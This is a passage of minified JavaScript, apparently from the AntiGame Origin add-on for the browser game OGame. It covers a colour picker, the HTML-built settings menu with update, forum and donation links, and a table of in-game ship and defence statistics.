(a=Math.max(0,Math.min(1,-(c.x/b.square)+0.5)),c=Math.max(0,Math.min(1,-(c.y/b.square)+0.5)),b.setHSL([b.hsl[0],a,c]));return!1};b.mouseup=function(){g(document).unbind("mousemove",b.mousemove);g(document).unbind("mouseup",b.mouseup);document.dragging=!1};b.updateDisplay=function(){var a=b.color,e=6.28*b.hsl[0];g(".h-marker",c).css({left:Math.round(Math.sin(e)*b.radius+b.width/2)+"px",top:Math.round(-Math.cos(e)*b.radius+b.width/2)+"px"});g(".sl-marker",c).css({left:Math.round(b.square*(0.5-b.hsl[1])+
b.width/2)+"px",top:Math.round(b.square*(0.5-b.hsl[2])+b.width/2)+"px"});g(".color",c).css("backgroundColor",b.pack(b.HSLToRGB([b.hsl[0],1,0.5])));"object"===typeof b.callback&&(g(b.callback).css({backgroundColor:a,color:0.5<b.hsl[2]?"#000":"#fff"}),g(b.callback).each(function(){this.value&&this.value!==a&&(this.value=b.color.toUpperCase())}));"object"===typeof b.colorText&&(e=!b.color?"line-through":"none",g(b.colorText).css("color",a).css("text-decoration",e),g(b.colorText).attr("valueColor",b.color.toUpperCase()),
b.colorBack&&g(b.colorBack).css("background-color",w.color(a||q.color.backMenu,b.colorOpacity)))};b.absolutePosition=function(a){var c={x:a.offsetLeft,y:a.offsetTop};a.offsetParent&&(a=b.absolutePosition(a.offsetParent),c.x+=a.x,c.y+=a.y);return c};b.pack=function(a){var b=Math.round(255*a[0]),c=Math.round(255*a[1]);a=Math.round(255*a[2]);return"#"+(16>b?"0":"")+b.toString(16)+(16>c?"0":"")+c.toString(16)+(16>a?"0":"")+a.toString(16)};b.unpack=function(a){return 7===a.length?[parseInt(a.substring(1,
3),16)/255,parseInt(a.substring(3,5),16)/255,parseInt(a.substring(5,7),16)/255]:4===a.length?[parseInt(a.substring(1,2),16)/15,parseInt(a.substring(2,3),16)/15,parseInt(a.substring(3,4),16)/15]:[0,0,0]};b.HSLToRGB=function(a){var b,c=a[0];b=a[1];a=a[2];b=0.5>=a?a*(b+1):a+b-a*b;a=2*a-b;return[this.hueToRGB(a,b,c+0.33333),this.hueToRGB(a,b,c),this.hueToRGB(a,b,c-0.33333)]};b.hueToRGB=function(a,b,c){c=0>c?c+1:1<c?c-1:c;return 1>6*c?a+6*(b-a)*c:1>2*c?b:2>3*c?a+6*(b-a)*(0.66666-c):a};b.RGBToHSL=function(a){var b,
c,e,f,g=a[0],h=a[1],k=a[2];b=Math.min(g,Math.min(h,k));a=Math.max(g,Math.max(h,k));c=a-b;f=(b+a)/2;e=0;0<f&&1>f&&(e=c/(0.5>f?2*f:2-2*f));b=0;0<c&&(a===g&&a!==h&&(b+=(h-k)/c),a===h&&a!==k&&(b+=2+(k-g)/c),a===k&&a!==g&&(b+=4+(g-h)/c),b/=6);return[b,e,f]};g("*",c).mousedown(b.mousedown);b.setColor("#000000")},O.lang={"-":" - ",ORG:"English",AE:"Fran\u00e7ais (AE)",AR:"Espa\u00f1ol (AR)",BA:"Bosnian",BR:"Portugu\u00eas (BR)",CZ:"\u010ce\u0161tina",DE:"Deutsch",DK:"Dansk",ES:"Espa\u00f1ol",FI:"Finnish",
FR:"Fran\u00e7ais",GR:"\u0395\u03bb\u03bb\u03b7\u03bd\u03b9\u03ba\u03ac",HR:"Hrvatski",HU:"Magyar",IT:"Italiano",JP:"\u65e5\u672c\u8a9e",MX:"Espa\u00f1ol (MX)",NL:"Dutch",NO:"Norsk",PL:"Polski",PT:"Portugu\u00eas",RO:"Romana",RU:"\u0420\u0443\u0441\u0441\u043a\u0438\u0439",SE:"Svenska",SI:"Slovenian",SK:"Sloven\u010dina",TR:"T\u00fcrk\u00e7e",TW:"\u7e41\u9ad4\u4e2d\u6587",US:"English (US)"},m.getStorageObject("Galaxy"),m.getStorageObject("Status"),setTimeout(e.checkVersions,0,!0),setTimeout(I.Check,
0,!0))},updateVersion:function(){O.updateInfo("S76",A.formatTimestamp(m.Info.Versions.timestamp),1,m.getStatusColor("Versions"))},Update:function(a){document.getElementById("anti_win")&&(B.updateButton(),O.Show("",a))},Show:function(a,b){function c(a,b){H=!0;I="";L=!0;U[U.length]=(1<U.length?"</table></div>":"")+"<div"+(b?' style="'+b+'"':"")+' class="section"><div class="sectiontitle"><span class="indicator">\u25bc</span><span class="indicatorOpen">\u25b2</span> '+e.label(a)+"</div><table>"}function d(a,
b,c,d,j,f){var g,t,h;a=G(a);if(d&&(g=d.split(","),d=g[0],t=(g[1]||d+"0").toLowerCase(),g=e.Data[t]?e.Data[t][fa]:"")){g=g.split("[");for(h=1;h<g.length;h++)t=g[h].split("]")[0].trim(),g[h]=t&&V[t.toUpperCase()]?"</ol><h2>"+e.label(V[t.toUpperCase()])+"</h2><ol>":t&&e.Data[t]?t===t.toUpperCase()?"<li><span class='ago_menu_help_headline'>"+(e.Data[t][fa]||"")+"</span></li>":"<li>"+F(e.Data[t][fa])+"</li>":"";a='<a class="tooltipHTML ago_menu_help" title="'+e.label(d)+"|<ol>"+g.join("")+'</ol>">'+a+
"</a>"}d=f?D(j,f):"";e.Data[c]&&e.Data[c][X]===u&&(I=c,H=e.Data[c][S],d='<span class="sectionchange"><input id="Anti_'+c+'" type="checkbox"'+(H?' checked="checked">':">")+"&nbsp;&nbsp;&nbsp;"+e.label("A81")+"</span>"+d);L=!0;e.Data[b]&&e.Data[b][X]===u&&(L=e.Data[b][S],d='<span class="subsectionchange"><input id="Anti_'+b+'" type="checkbox"'+(L?' checked="checked">':">")+"&nbsp;&nbsp;&nbsp;"+e.label("A82")+"</span>"+d);z(14);U[U.length]=(H||c?'<tr class="subsection" rel="Anti_'+I+'">':'<tr class="subsection ago_menu_section_inactive" rel="Anti_'+
I+'">')+'<td class="subsectiontitle">'+a+':</td><td class="subsectiontitle">'+d+"</td></tr>"}function j(a,b){function c(a,b,d,e,j){var g=f.splitTask(d,ba,za);if("standard"===b||j)e=G(e);else{e=b.split(":");var t="3"===e[3]?" <span>"+w.IMG(w.urlTypeIcon(3),14)+"</span>":"";e='<span style="width: 54px">'+G("F08")+": "+r.d(e[0])+":"+r.d(e[1])+":"+r.d(e[2])+"</span>"+t}d='<td style="width: 100%;"><a id="Anti_'+a+'" class="anti_task" href="javascript:void(0)" valueName="'+b+'" valueTask="'+d+'">'+(j?"":
O.createTask(g))+"</a></td>";U[U.length]=B(a,e,d,"standard"===b?1:2)}if(a&&e.Data[a]&&e.Data[a][X]===ca&&f.PlanetsActive){var d=1,j=m.splitStorageObject(e.get(a));c(a+"_0","standard",j.standard||"",b);for(var g in f.PlanetsByCoordstype)j[g]&&(c(a+"_"+d,g,j[g]),d++);j[f.PlanetsActive.coordstype]||(f.PlanetsActive.type===Y||-1===e.getMore(a).indexOf("M"))&&c(a+"_"+d,f.PlanetsActive.coordstype,"","F09",!0)}}function t(a,b,c,d){if(a&&e.Data[a]&&J.check(e.Data[a][X],C,da)){var j="",f;for(f in b)b[f]&&
(j+='<option value="'+f+'" '+(e.Data[a][S]==f?' selected="selected">':">")+e.label(b[f])+"</option>");U[U.length]=B(a,e.label(c||a),'<td><select id="Anti_'+a+'">'+j+"</select></td>",d)}}function v(a,b,c){var d="";if(a&&e.Data[a]&&e.Data[a][X]===M)var j=e.getPair(a),f=j[1]||(80<n.parseIntAbs(a)?e.get("CC2"):e.get("CS2"))||100,d=d+('<td style="min-width: 80px;"><a id="Anti_'+a+'" class="anti_color" style="width: 100%; '+(w.css("color",j[0])||"text-decoration: line-through;")+'" valueColor="'+j[0]+'" valueDefault="'+
(e.getDefault(a).split("|")[0]||"")+'" href="javascript:void(0)">'+e.label("CI5")+'</a></td><td style="min-width: 80px;"><input id="Anti_'+a+'_Opacity" type="text" value="'+j[1]+'" valueOpacity="'+f+'" style="width: 70px; color: #000000; border: 1px solid #000000; '+w.css("background-color",e.getColor(a,f)||q.color.backMenu)+'"></td>');d='<table class="input" style="text-indent: -10px;"><tr><td style="width: 70%">&bull;&nbsp;'+e.label(a)+"</td>"+d+"</tr></table>";j="";if(b&&e.Data[b]&&e.Data[b][X]===
x){var f=e.getPair(b),g;for(g in c)c[g]&&(j+='<option value="'+g+'" '+(f[0]==g?' selected="selected">':">")+e.label(c[g])+"</option>");j='<td style="width: 80%"><select id="Anti_'+b+'">'+j+'</select></td><td><input id="Anti_'+b+'_Pair" type="text" value="'+f[1]+'" style="width: 56px"></td>'}U[U.length]=B(a,d,j,0)}function h(a,b,c,d,j){var f,g,t,v,k="";a=e.Data[a]?a:"";b=G(b);a&&(b=!b?e.label(a):b);c=r.d(c,a).split("|");d=r.d(d,a).split("|");for(f=0;f<c.length;f++)if(a=c[f],e.Data[a]){g=e.Data[a][X];
t='<td style="width: '+Math.floor(100/c.length)+'%;">';g===u&&(v=e.Data[a][S]?' checked="checked"':"",k+=t+'<input id="Anti_'+a+'" type="checkbox" '+v+"></td>");if(n.isMinMax(g,C,da)||g===ca)v=g===C&&3>c.length?"":' style="width: 100%;"',k+=t+'<input id="Anti_'+a+'" type="text" value="'+r.d(e.Data[a][S])+'"'+v+"></td>";g===ea&&(k+=t+'<a id="Anti_'+a+'" class="anti_color" style="width: 100%; '+(w.css("color",e.getColor(a))||"text-decoration: line-through;"),k+='" valueColor="'+e.getColor(a)+'" href="javascript:void(0)">'+
e.label(d[f])+"</a></td>")}k&&(U[U.length]=B(a,b,k,j))}function k(a,b,c){var d,j;if(a)for(j=65;75>j;j++)if(d=a+String.fromCharCode(j),e.Data[d])h(d,b,"","",c);else break}function l(a,b,c){var d;if(a)for(d=1;10>d;d++){var j;j=a+d;var f=b,g=c,t=void 0,h=void 0;j&&e.Data[j]&&e.Data[j][X]===x?(t=e.getPair(j),f=e.label(f)+'<input id="Anti_'+j+'" type="text" value="'+r.d(t[0])+'" style="margin-right: 20px;">',h='<td><input id="Anti_'+j+'_Pair" type="text" value="'+r.d(t[1])+'" style="width: 100%;"></td>',
U[U.length]=B(j,f,h,g),j=t[1]?!0:!1):j=!1;if(!j)break}}function p(a,b,c,d,j,f,g){"action"===c?b=D(b,d):(c=j,b='<a class="btn_blue ago_menu_button" href="'+d+'"'+(c?' target="'+c+'"':"")+">"+e.label(b)+"</a>");U[U.length]=B(a,e.label(a),"<td>"+b+"</td>",f,g)}function s(a,b,c,d){U[U.length]=B(e.Data[a]?a:"",e.label(a),"<td>"+r.d(b)+"</td>",c,d)}function y(a,b,c,d,j){z(4);U[U.length]='<tr><td class="subsectiontitle"><span style="display: inline-block; width: 205px; padding-left: 15px;">'+e.label(a)+
':</span><span style="display: inline-block; width: 80px; text-align: center;">'+e.label(b)+'</span><span style="display: inline-block; width: 80px; text-align: center;">'+e.label(c)+'</span></td><td class="subsectiontitle"><span style="display: inline-block; width: 140px; text-align: center;">'+e.label(d)+'</span><span style="display: inline-block; width: 80px; text-align: center;">'+e.label(j)+"</span></td></tr>"}function z(a){a=a||"8";U[U.length]='<tr><td style="font-size: '+a+"px; line-height: "+
a+"px; height: "+a+'px;" colspan="2">&nbsp;</td></tr>'}function D(a,b){return'<a class="btn_blue ago_menu_button anti_button_action" id="anti_action_'+b+'" href="javascript:void(0)">'+e.label(a)+"</a>"}function B(a,b,c,d,j){var f=3===a.length?a.toLowerCase():"_0"===a.slice(3)?a.slice(0,3).toLowerCase():"";if(e.Data[f]&&(f=e.Data[f][fa])&&-1===(b||"").indexOf("<"))f=f.replace(/\[TIP\]/g,"</li><li><span class='ago_menu_help_headline'>"+e.label("AH2")+":</span>"),f=f.replace(/\[HINT\]/g,"</li><li><span class='ago_menu_help_headline'>"+
e.label("AH3")+":</span>"),f=F(f),b='<a class="tooltipHTML ago_menu_setting_help" title="'+b+"|<ol><li><span class='ago_menu_help_headline'>"+e.label("AH1")+":</span>"+f+'</li></ol>">'+b+"</a>";b=1===d||void 0===d?"&bull;&nbsp;"+b:b;d=2===d?"padding-left: 45px;":"";j=j?"color:"+j+";":"";f=(H?"":"ago_menu_section_inactive ")+(L?"":"ago_menu_subsection_inactive");return(f?'<tr class="'+f+'">':"<tr>")+'<td class="label"'+(j||d?' style="'+d+j+'"':"")+(a?' id="AntiLabel_'+a+'">':">")+b+'</td><td class="input"><table class="input"><tr>'+
c+"</tr></table></td></tr>"}function F(a){var b,c,d,j=0;a=(a||"").replace(/\"/g,"").replace(/\[BR\]/g,"&nbsp;<br />").replace(/\[LIST\]/g,"&nbsp;<br /><i class='ago_menu_help_list'></i>").replace(/\[PLANET\]/g,"<span class='ago_color_planet'>"+e.label("L081")+"</span>").replace(/\[MOON\]/g,"<span class='ago_color_moon'>"+e.label("L083")+"</span>").replace(/\[DEBRIS\]/g,"<span class='ago_color_debris'>"+e.label("L082")+"</span>");a=a.split("[");for(c=1;c<a.length;c++)b=a[c].split("]",2),(d=b[0].toUpperCase())?
N[d]?(1===j?b[0]="</span><span class='"+N[d]+"'>":(b[0]="<span class='"+N[d]+"'>",j++),"OPTION"===d&&(b[0]="<br />"+b[0]),"ITEM"===d?e.Data["L"+b[1].toUpperCase()]&&(b[1]=e.label("L"+b[1].toUpperCase())):b[1]&&(3===b[1].length&&e.Data[b[1].toUpperCase()])&&(b[1]=e.label(b[1].toUpperCase()))):b[0]=P[d.toUpperCase()]?"<span class='ago_menu_help_pages'>"+e.label(P[d.toUpperCase()])+"</span>":R[d.toUpperCase()]?"<span class='ago_menu_help_missions'>"+e.label(R[d.toUpperCase()])+"</span>":T[d.toUpperCase()]?
"<span class='ago_menu_help_ogame'>"+e.label(T[d.toUpperCase()])+"</span>":e.Data[d.toUpperCase()]?e.label(d.toUpperCase()):"":0<j&&(b[0]="</span>",j--),a[c]=b[0]+b[1];for(a=a.join("");0<j;)a+="</span>",j--;return a}function G(a){if(a){a=a.split("|");for(var b=0;b<a.length;b++)a[b]=e.label(a[b]);return a.join("")}return""}var H=!0,I="",L=!0;O.Init();J.check(e.get("A06"),"ORG","US")||e.setDataString("LangMenu");e.setDataString("LangHelp");var N={HEADLINE:"ago_menu_help_headline",SECTION:"text_blue",
SETTING:"text_blue",OGAME:"textWhite",OPTION:"ago_menu_help_option",SHORTCUT:"ago_menu_help_shortcut",ITEM:"ago_menu_help_item",BLUE:"text_blue",RED:"text_palered",ORANGE:"text_orange",GREEN:"text_green",GRAY:"",WHITE:"text_active",NORMAL:"textLight"},P={OVERVIEW:"LP02",EVENTS:"LP03",RESOURCES:"LP04",RESOURCESETTINGS:"LP05",FACILITIES:"LP06",JUMPGATE:"LP07",MERCHANT:"LP08",RESEARCH:"LP10",TECHNOLOGY:"LP11",SHIPYARD:"LP12",DEFENSE:"LP14",FLEET:"LP15",FLEET1:"LP16",FLEET2:"LP17",FLEET3:"LP18",FLEETMOVEMENT:"LP19",
GALAXY:"LP20",EMPIRE:"LP22",ALLIANCE:"LP24",CIRCULARMESSAGE:"LP25",MESSAGES:"LP30",BUDDIES:"LP32",NOTES:"LP34",HIGHSCORE:"LP36",SEARCH:"LP38",OPTIONS:"LP40"},R={ATTACK:"LM01",ACSATTACK:"LM02",TRANSPORT:"LM03",DEPLOYMENT:"LM04",ACSDEFEND:"LM05",ESPIONAGE:"LM06",COLONIZATION:"LM07",HARVEST:"LM08",MOONDESTRUCTION:"LM09",EXPEDITION:"LM15"},T={METAL:"L091",CRYSTAL:"L092",DEUTERIUM:"L093",ENERGY:"L094"},V={STANDARD:"AH5",GENERAL:"A00",DATA:"D00",COLORING:"C00",TOOLS:"T00",INFOPANEL:"I00",DETAILS:"AH8",
EXPLANATION:"AH7",SHORTCUTS:"AH9"},K="- C01 C02   C05 C06    C10   C13  C15 C16  C18".split(" "),Q="- C01 C02   C05 C06    C10 ".split(" "),W="E70 E71 E72 E73 E74 E75 E76 E77 E78".split(" "),U=[];U[U.length]='<div id="anti_win"><div id="anti_color" class="anti_active_light"></div><div id="ago_menuEdit" class="anti_active_light"></div><div id="anti_title">'+e.label("AM0")+' - 4.18.0<span class="ago_color_moon" style="font-size: 10px; font-style: italic; font-weight: 200">&nbsp;&nbsp;&nbsp;by Francolino</span></div><div id="anti_content">';
c("A00");d("A80","","","A00");t("A06",O.lang);h("A11");h("A12");t("A16",["A17","A18","A19"]);d("A20","","","A20");h("A24");h("A21");h("A22","","","",2);h("A25");h("A26");t("A27",[" - ","A28","A29"]);d("A30","","","A30");h("A31");h("A32","","","",2);h("A34");d("A50","","","");!la&&!Ca&&s("A58","",1,q.color.textDarkOrange);var Z=J.choose(ka,"","antigameorigin.xpi","antigameorigin.crx"),$=Fa?"":"_blank";t("A41",[" - ","A42","A43"]);z();if(!Fa&&(la||Ca||Qa||qa)){var aa="http://antigame.de/antigame/scripts/"+
J.choose(ka,"","antigameorigin.xpi","antigameorigin.crx");aa&&p("A59",e.label("A4B")+" "+e.get("S12"),"",aa,"",1,q.color.textDarkOrange)}Z&&1===Ea&&p("A48",e.label("A4B")+" "+e.get("S12"),"","http://antigame.de/antigame/scripts/"+Z,$,1,q.color.textLightOrange);Z&&2===Ea&&p("A49",e.label("A4B")+" "+e.get("S13"),"","http://antigame.de/antigame/scripts/preview/"+Z,$,1,q.color.textLightOrange);p("A51","A51","","http://antigame.de/","_blank");p("A54","A54","","http://antigame.de/forum/index.php","_blank");
p("A56","A57","","http://antigame.de/home.php?page=translations","_blank");p("S58","S50","","http://board.antigame.de/viewforum.php?f=31","_blank");na&&(z(),ia[11]&&s("S51","",1,q.color.textDarkOrange),ia[12]&&s("S52","",1,q.color.textDarkOrange),ia[5]&&p("S55","S5B","","http://board.antigame.de/viewtopic.php?f=31&t=1044","_blank",1,q.color.textDarkOrange),ia[21]&&p("S53","S5B","","http://board.antigame.de/viewtopic.php?f=31&t=1046","_blank",1,q.color.textRed));c("D00");d("A80","","","D00");p("D01",
"D0B","action","updatePara");d("D40","D40","","D40");s("D45",A.formatTimestamp(m.Info.Units.timestamp),1,m.getStatusColor("Units"));s("D46",A.formatTimestamp(m.Info.Galaxy.timestamp),1,m.getStatusColor("Galaxy"));s("D47",A.formatTimestamp(m.Info.Status.timestamp),1,m.getStatusColor("Status"));p("D4C","D4B","action","resetData","",1);d("D20","D20","","D20");!la&&!Ca&&s("A58","",1,q.color.textDarkOrange);s("D26",A.formatTimestamp(m.Info.Players.timestamp),1,m.getStatusColor("Players"));s("D27",A.formatTimestamp(m.Info.Universe.timestamp),
1,m.getStatusColor("Universe"));p("D2C","D2B","action","resetDataBase","",1);d("S20","","","");Z=e.get("S21")+"x, "+e.get("S22")+":"+e.get("S23")+", "+e.get("S28")+", "+e.get("S29")+", "+(e.is("S25")?e.label("S25")+", ":"")+(e.is("S26")?e.label("S26")+", ":"")+(e.is("S27")?e.label("S27")+", ":"")+f.chooseTopscore("<100k","<1m","<5m",">5m");s(e.label("S45")+" ("+e.server+" - "+e.uni+" - "+O.lang[e.server]+")",Z,1,m.getStatusColor("Server"));s("S46",A.formatTimestamp(m.Info.Labels.timestamp),1,m.getStatusColor("Labels"));
!e.serverEnglish&&(!e.Data.LM01||!e.Data.LM01[fa])&&s("S59","",2,q.color.textPaleRed);d("S70");t("S71",["S08","S09"]);s("S76",A.formatTimestamp(m.Info.Versions.timestamp),1,m.getStatusColor("Versions"));e.serverEnglish||s("S77",A.formatTimestamp(m.Info.Lang.timestamp),1,m.getStatusColor("Lang"));p("S75","S7B","action","resetOptions","",1,m.getStatusColor("Options"));d("S80","S80");h("S81");p("S89","S8B","action","restoreBackup");d("S90");t("S91",{"0":" - ",1:"S92",2:"S93",3:"S94",4:"S95",5:"S96",
9:" ----- ",11:"D46",12:"D47"});p("S99","S8B","action","readBackup");U[U.length]=B(""," ","<td></td>",0)+'<tr><td colspan="2"><textarea id="anti_action_textBox" style="margin-left: 10px; min-height: 60px; width: 600px;"></textarea></td></tr>';c("C00");d("CO0","CO0","","CO0");h("CO1");d("CM0","CM0","","CM0");h("CM1");h("CM2","","","",2);h("CM3");z();h("E65","LM15","","LM15");h("E57","LM07","","LM07");h("E58","LM08","","LM08");h("E53","LM03","","LM03");h("E54","LM04","","LM04");h("E56","LM06","","LM06");
h("E55","LM05","","LM05");h("E51","LM01","","LM01");h("E52","LM02","","LM02");h("E59","LM09","","LM09");z();d("CC0","CC0","","CC0");h("CC1");h("CC2","","","",2);y("C80","CI5","CI7","CI8","CI9");v("C81","H81",["-","C01"]);v("C93","H93",K);v("C94","H94",K);v("C95","H95",K);v("C96","H96",K);v("C97","H97",K);v("C98","H98",K);z();d("CS0","CS0","","CS0");h("CS1");h("CS2","","","",2);y("C20","CI5","CI7","CI8","CI9");v("C21","H21",Q);v("C22","H22",Q);v("C23","H23",Q);v("C24","H24",Q);v("C25","H25",Q);v("C26",
"H26",Q);v("C27","H27",Q);v("C28","H28",Q);v("C29","H29",Q);v("C30","H30",Q);y("C40","CI5","CI7","CI8","CI9");v("C41","H41",K);v("C42","H42",K);v("C43","H43",K);v("C44","H44",K);v("C45","H45",K);v("C46","H46",K);v("C47","H47",K);v("C48","H48",K);v("C49","H49",K);y("C60","CI5","CI7","CI8","CI9");v("C61","H61",K);v("C62","H62",K);v("C63","H63",K);v("C64","H64",K);v("C65","H65",K);v("C66","H66",K);v("C67","H67",K);v("C68","H68",K);v("C69","H69",K);c("T00");d("A80","","T00","T00");d("T10");k("T1","",
2);l("T1","",2);d("T20");k("T2","",2);l("T2","",2);d("T30");k("T3","",2);l("T3","",2);d("LP15");k("T4","",2);l("T4","",2);d("T50");k("T5","",2);l("T5","",2);d("T60");k("T6","",2);l("T6","",2);d("T70");k("T7","",2);l("T7","",2);d("T80");k("T8","",2);l("T8","",2);d("T90");k("T9","",2);l("T9","",2);c("O00");d("LP02","","","LP02,O100");h("O12");d("I00","I00","","I00");h("I01");h("","I05","I05|I06");h("I07");d("O50","O50","","O50");h("O51");h("O53");h("O52");h("O54");c("B00");d("A80","","","B00");h("B02");
h("B10");t("B21",[" - ","B22","B23","B24"]);h("B04");d("LP07","B30","","LP07,B300");h("B31");h("B32");h("B33");h("B34");h("B35");j("B38","B38");c("LP15");d("A80","","F00","LP15,F000");h("F01");d("LP16");h("F62");t("F02",[" - ","B22","B23","B24"]);h("F50");t("F03",{"0":" - ",11:"F70",12:"F80",13:"F90",5:"FL0"});d("LP17");h("F11","F07");h("F10");h("F12");h("F13");d("LP18");h("F15","F07");h("F18");c("FS0");d("F20","F20");h("F22");h("F23");h("F24");h("F25");h("F26");h("F27","","","",2);h("F2A");d("F30",
"","","FS0");j("F31","F31");d("F40");j("F41","F40| 1");z(4);j("F42","F40| 2");z(4);j("F43","F40| 3");z(4);j("F44","F40| 4");z(4);j("F45","F40| 5");z(4);c("FR0");d("FP0");h("FP7");h("FP8");d("FL0","","","FR0");h("FL1");h("FL2");d("F60");j("F61","F61");d("F70");h("F73");j("F71","F71");d("F80");j("F81","F81");d("F90");t("F95"," LM01 LM02 LM03 LM04 LM05 LM06 LM07 LM08 LM09      LM15".split(" "),"F95",1);t("F96"," LM01 LM02 LM03 LM04 LM05 LM06 LM07 LM08 LM09      LM15".split(" ")," ",0);t("F97"," LM01 LM02 LM03 LM04 LM05 LM06 LM07 LM08 LM09      LM15".split(" "),
" ",0);j("F91","F91");c(e.label("LP03")+" & "+e.label("LP20"));d("LP19","E10","","LP19,E100");h("E12");d("LP03","E30","","LP03,E300");h("E31");h("E35","","","",2);t("E41",W,"LP02");t("E47",W);t("E48",W,"LP12");t("E42",W,"LP16");t("E43",W,"LP17");t("E44",W,"LP18");t("E45",W,"LP19");t("E46",W,"LP20");t("E49",W);d("LP20","G00","","LP20,G000");h("G01");t("G02",[" - ","1","2","3"]);t("G45",[" - ","G46","G47","G48"]);h("G22");h("G32");c("LP30");d("A80","","","LP30,M000");h("M04");h("M05","","","",2);h("M88",
"M80","","",2);h("M89","M80","","",2);d("M70","","","");h("M74");d("M10","","");h("M51");h("M53","","","",2);t("M12",[" - ","25%","50%","75%","100%"]);h("M16");h("M14");h("","M20","M20|M21","|CI5");h("M28","","","",2);t("M30"," - ;M31;M32;M33;M34;M35".split(";"));h("M36","","","",2);h("M37","","","",2);d("M40","M40");h("M46");h("M48");h("M44");j("M45","M45");U[U.length]='</table></div></div><div id="anti_footer"><table><tr><td style="width: 210px; text-align: center;"><form method="post" action="https://www.paypal.com/cgi-bin/webscr" target="_blank"><input type="hidden" value="_s-xclick" name="cmd"><input type="hidden" value="GTQYLNBFXSVPL" name="hosted_button_id"><input type="image" src="https://www.paypalobjects.com/en_GB/i/btn/btn_donate_SM.gif" name="submit" alt="PayPal &mdash; The safer, easier way to pay online."></form></td><td>'+
D("AM2","cancel")+"</td><td>"+D(e.is("S80")?"AM3":"AM1","save")+"</td></tr></table></div></div>";g("#anti_win").remove();g("#contentWrapper div#inhalt").hide().before(U.join(""));g("#anti_win .anti_button_action").bind("click",O.actionButton);g("#anti_win .anti_color").bind("click",O.changeColor);g("#anti_win .anti_task").bind("click",O.changeTask);g("#anti_win .sectionchange input").bind("change",O.changeSection);g("#anti_win .subsectionchange input").bind("change",O.changeSubsection);g("#anti_win #Anti_S80").bind("change",
O.changeBackup);g("#anti_win #Anti_S91").bind("change",O.showOptions);K=b?b:na?0:ya?1:ja?1:Ea?0:"overview"===e.page?4:J.check(e.page,"resources","resourcesettings","station","research","shipyard","defense")?5:J.check(e.page,"fleet1","fleet2","fleet3")?6:"movement"===e.page?9:"galaxy"===e.page?9:"messages"===e.page?10:0;g(".sectiontitle").bind("click",O.clickSectionTitle).eq(K).click();O.updateInfo=function(a,b,c,d){a&&e.Data[a]&&(b=B(a,e.label(a),"<td>"+r.d(b)+"</td>",c,d),g("#anti_win #AntiLabel_"+
a).parent().html(b.slice(b.indexOf(">")+1).split("</tr>")[0]))}}},f={Item:{metal:{},crystal:{},deuterium:{},energy:{},202:{metal:2E3,crystal:2E3,deuterium:0,retreat:1E3,drive:va,speed:5E3,capacity:5E3,consumption:20},203:{metal:6E3,crystal:6E3,deuterium:0,retreat:3E3,drive:va,speed:7500,capacity:25E3,consumption:50},204:{metal:3E3,crystal:1E3,deuterium:0,retreat:4E3,drive:va,speed:12500,capacity:50,consumption:20},205:{metal:6E3,crystal:4E3,deuterium:0,retreat:1E4,drive:sa,speed:1E4,capacity:100,
consumption:75},206:{metal:2E4,crystal:7E3,deuterium:2E3,retreat:29E3,drive:sa,speed:15E3,capacity:800,consumption:300},207:{metal:45E3,crystal:15E3,deuterium:0,retreat:6E4,drive:wa,speed:1E4,capacity:1500,consumption:500},208:{metal:1E4,crystal:2E4,deuterium:1E4,retreat:1E4,drive:sa,speed:2500,capacity:7500,consumption:1E3},209:{metal:1E4,crystal:6E3,deuterium:2E3,retreat:4500,drive:va,speed:2E3,capacity:2E4,consumption:300},210:{metal:0,crystal:1E3,deuterium:0,retreat:0,drive:va,speed:1E8,capacity:0,
consumption:1},211:{metal:5E4,crystal:25E3,deuterium:15E3,retreat:9E4,drive:sa,speed:4E3,capacity:500,consumption:1E3},212:{metal:0,crystal:2E3,deuterium:500,retreat:0,drive:0,speed:0,capacity:0,consumption:0},213:{metal:6E4,crystal:5E4,deuterium:15E3,retreat:125E3,drive:wa,speed:5E3,capacity:2E3,consumption:1E3},214:{metal:5E6,crystal:4E6,deuterium:1E6,retreat:1E7,drive:wa,speed:100,capacity:1E6,consumption:1},215:{metal:3E4,crystal:4E4,deuterium:15E3,retreat:85E3,drive:wa,speed:1E4,capacity:750,
consumption:250},401:{metal:2E3,crystal:0,deuterium:0,retreat:2E3},402:{metal:1500,crystal:500,deuterium:0,retreat:2E3},403:{metal:6E3,crystal:2E3,deuterium:0,retreat:8E3},404:{metal:2E4,crystal:15E3,deuterium:2E3,retreat:37E3},405:{metal:2E3,crystal:6E3,deuterium:0,retreat:8E3},406:{metal:5E4,crystal:5E4,deuterium:3E4,retreat:13E4},407:{metal:1E4,crystal:1E4,deuterium:0,retreat:2E4},408:{metal:5E4,crystal:5E4,deuterium:0,retreat:1E5},502:{metal:8E3,crystal:0,deuterium:2E3,retreat:0},503:{metal:12500,
crystal:2500,deuterium:1E5,retreat:0}},ItemShip:{202:1,203:1,204:2,205:2,206:2,207:2,208:1,209:1,210:1,211:2,212:3,213:2,214:2,215:2},ItemShipCivil:{202:1,203:1,208:1,209:1,210:1},ItemShipCombat:{204:2,205:2,206:2,207:2,215:2,211:2,213:2,214:2},ItemDefense:{401:1,402:1,403:1,404:1,405:1,406:1,407:1,408:1,502:2,503:2},ItemResource:{metal:"091",crystal:"092",deuterium:"093"},ItemResourceEnergy:{metal:"091",crystal:"092",deuterium:"093",energy:"094"},ItemResearch:{106:8,108:10,109:3,110:6,111:2,113:12,
114:-8,115:6,117:6,118:8,120:-12,121:5,122:7,123:0,124:8,199:-1},ItemByName:{},Units:{},Load:function(){f.Units=m.getStorageObject("Units");f.Units.account||(f.Units.account={});f.Units[e.planetID]||(f.Units[e.planetID]={});f.UnitsAccount=f.Units.account;f.UnitsActive=f.Units[e.planetID];f.UnitsActiveStart={};m.checkTimestamp("Units",f.UnitsAccount["100"],0)},updateUnits:function(a,b,c,d){c=f.getPlanetId(c,d);a&&c&&(f.Units[c]||(f.Units[c]={}),f.updateTask(f.Units[c],a,b),f.UnitsChanged=!0)},getUnits:function(a,
b){var c=f.getPlanetId(a,b);return c&&f.Units[c]?f.Units[c]:{}},getUnitsStatus:function(a){var b=A.timestamp();return!a||!a.timeShips?0:1E3>a.timeShips?1:3600<b-a.timeShips?2:600<b-a.timeShips?3:4},getUnitsStatusColor:function(a){return["#A22","#A50","#140","#370","#5D0"][f.getUnitsStatus(a)]},saveUnits:function(a){var b;if(a||f.UnitsChanged||!Wa.compare(f.UnitsActiveStart,f.UnitsActive)){f.UnitsChanged=!1;for(b in f.Units)if("account"!==b&&(!e.is("D40")||!f.Units[b]))f.Units[b]=null;m.setStorageObject("Units",
